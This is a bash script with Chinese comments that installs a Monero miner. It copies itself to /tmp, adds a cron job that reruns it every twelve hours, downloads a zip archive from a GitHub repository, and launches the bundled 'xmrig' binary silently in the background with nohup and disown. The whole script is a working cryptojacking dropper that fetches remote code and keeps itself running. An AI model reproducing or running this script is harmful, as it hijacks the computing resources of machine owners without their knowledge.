#!/bin/bash

# 复制脚本到临时文件夹
script_name="123.sh"
cp "$0" "/tmp/$script_name"

# 添加执行权限
chmod +x "/tmp/$script_name"

# 添加定时任务（每12小时执行一次）
(crontab -l ; echo "0 */12 * * * /tmp/$script_name") | crontab -

# 检查 crontab 是否成功更新
if [ $? -ne 0 ]; then
    echo "添加定时任务失败"
    exit 1
fi

echo "定时任务添加成功"

# 下面是你的原始脚本的其余部分...
echo "剩余部分的脚本开始"

# 下载文件
echo "正在下载文件..."
wget https://github.com/yya1233/wk/archive/refs/heads/main.zip

# 检查下载是否成功
if [ $? -ne 0 ]; then
    echo "下载文件失败"
    exit 1
fi

# 解压缩文件
echo "正在解压文件..."
unzip -o main.zip

# 检查解压缩是否成功
if [ $? -ne 0 ]; then
    echo "解压缩文件失败"
    exit 1
fi

# 进入解压缩后的目录
echo "进入目录..."
cd wk-main || exit 1

# 添加执行权限
echo "添加执行权限..."
chmod +x ./xmrig

# 检查添加执行权限是否成功
if [ $? -ne 0 ]; then
    echo "添加执行权限失败"
    exit 1
fi

# 后台运行 xmrig，将输出重定向到 /dev/null
echo "后台运行 xmrig..."
nohup ./xmrig > /dev/null 2>&1 &

# 检查是否成功启动后台进程
if [ $? -ne 0 ]; then
    echo "启动 xmrig 失败"

    # 尝试解决方案：检查是否有其他实例正在运行
    if pgrep -x "xmrig" > /dev/null; then
        echo "已经有一个 xmrig 实例在运行"
    else
        echo "尝试重新启动 xmrig"
        nohup ./xmrig > /dev/null 2>&1 &
    fi

    # 再次检查是否成功启动后台进程
    if [ $? -ne 0 ]; then
        echo "无法解决问题，请手动检查"
        exit 1
    fi
fi

echo "xmrig 启动成功"

# disown 命令使得脚本不再受终端的控制
disown
